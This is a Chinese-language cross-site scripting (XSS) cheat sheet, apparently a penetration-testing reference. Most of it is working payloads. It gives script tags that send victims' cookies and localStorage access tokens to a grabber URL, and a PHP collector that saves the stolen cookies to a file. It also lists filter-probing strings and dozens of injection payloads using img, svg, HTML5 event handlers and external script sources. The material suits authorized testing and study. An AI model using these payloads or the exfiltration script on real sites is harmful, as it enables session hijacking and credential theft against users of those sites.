# Cross Site Scripting(XSS)

漏洞说明：XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。

## 目录
- [常见的利用代码](#常见的利用代码)
  - [XSS获取cookie代码](#XSS获取cookie代码)
- [常用的XSS关键字](#常用的xss关键字，判断是否过滤)
- [HTML页面中的的XSS](#HTML页面中的的XSS)

## 常见的利用代码

### XSS获取cookie代码

能够获取到用户cookie的代码

```html
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
```

把下面代码写入到cookie.php，该代码将获取到的cookie保存到cookies.txt文件中

```php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie.'\r\n');
fclose($fp);
?>
```

## 常用的xss关键字，判断是否过滤
```html

>
">
'>
./
.\
\/
>>
>>'>
><">
'>>
">>
'>'>
">">
')
")
'')
')')
"))
"")
")")
''/
""/
'/'/
"/"/
''\
'\'\
"\"\
""\
```
## HTML页面中的的XSS

基本xss
```javascript

基本的payload

<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>

Img 图片插入 payload
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>

Svg 插入payload
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)

Div插入payload
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>
```

H5使用的xss
```javascript
<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>

<body ontouchstart=alert(1)> // Triggers when a finger touch the screen
<body ontouchend=alert(1)>   // Triggers when a finger is removed from touch screen
<body ontouchmove=alert(1)>  // When a finger is dragged across the screen.
```
使用script标签，外部引用
```javascript
<script src=14.rs>
<script src=14.rs/#payload>
<script src=14.rs/#alert(document.domain)>
```

input隐藏标签中xss

```javascript
<input type="hidden" accesskey="X" onclick="alert(1)">

使用CTRL+SHIFT+X出发xss弹窗
accesskey 是全局属性
它是用来设定选择页面上的元素的快捷键的
```

DOM型XSS

```javascript
#"><img src=/ onerror=alert(2)>
```

js文本XSS(一个没有引号和单引号的payload)

```javascript
-(confirm)(document.domain)//

注释：confirm(message)：confirm() 方法用于显示一个带有指定消息和 OK 及取消按钮的对话框。

; alert(1);//
```

XSS URL

```javascript
URL/<svg onload=alert(1)>
URL/<script>alert('XSS');//
URL/<input autofocus onfocus=alert(1)>
```